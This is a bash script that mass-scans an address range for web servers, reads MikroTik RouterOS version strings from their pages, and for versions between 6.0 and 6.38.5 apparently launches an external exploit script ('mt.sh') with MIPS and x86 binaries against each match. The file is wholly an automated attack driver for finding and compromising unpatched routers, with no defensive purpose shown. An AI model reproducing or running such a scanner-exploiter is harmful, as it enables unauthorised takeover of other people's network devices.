#!/bin/bash
killall -9 watch
gnome-terminal --command="watch -n 1 'tail -n 1 bambam.txt'"
clear
nmap_path=`which nmap`
file_name=`echo $1 | awk -F "/" '{print $1}'`
echo 'Running nmap'
$nmap_path -T5 -sT -p 80 --open $1 -oG - | awk '$4=="Ports:"{print $2,":"$5}' | awk -F "/" '{print $1}' > tmp/output_`echo $1 | awk -F "/" '{print $1}'`.txt

 #file_content=`cat output_$file_name.txt`
 IFS=$'\r\n' GLOBIGNORE='*' command eval  'arr=($(cat tmp/output_$file_name.txt))'

echo 'Nmap finished'
for i in "${arr[@]}"
do

	echo  'Testing : '$i
	ver=`curl --connect-timeout 3 -m 3 -s $i | grep -i RouterOS | awk -F ">" {'print $2'} | awk -F "<" {'print $1'} | head -2 | grep -v "configura" | awk -F "v" {'print $2'} | awk -F "." {'print $2"."$3'}` 
	ver_total=`curl --connect-timeout 3 -m 3 -s $i | grep -i RouterOS | awk -F ">" {'print $2'} | awk -F "<" {'print $1'} | head -2 | grep -v "configura" | awk -F "v" {'print $2'} `
	version_ok=38.5
	version_ok2=6.0
	echo $ver_total
if [ -z "$ver" ]
	then
		echo "No Mikrotik" #> /dev/null
	else
		if [[ "$ver" < "$version_ok" ]] && [[ "$ver_total" > "$version_ok2" ]];
		then
			ip=`echo $i | awk -F ":" '{print $1}'`
			port=`echo $i | awk -F ":" '{print $2}'`
			echo $ip $port $ver_total
			echo 'Testing with mipsbe binary...'
			./mt.sh $ip $ver_total  $port 'mipsbe'
			echo 'Testing with x86 binary...'
			./mt.sh $ip $ver_total  $port 'x86'
		else
			echo "Not supported" #> /dev/null
		fi
fi
done

echo "Finish"
